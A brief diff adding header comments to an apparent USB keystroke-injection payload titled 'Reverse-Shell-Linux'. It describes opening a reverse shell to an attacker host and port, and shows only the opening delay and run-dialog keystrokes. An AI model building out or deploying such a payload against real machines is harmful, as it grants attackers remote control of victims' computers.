@@ -1,3 +1,8 @@
+REM     Title: Reverse-Shell-Linux
+
+REM     Author: cbk914
+
+REM     Description: This payload is meant to open a reverse shell [Edit attacker-host and attacker-port]
 DELAY 1000
 GUI r
 DELAY 200
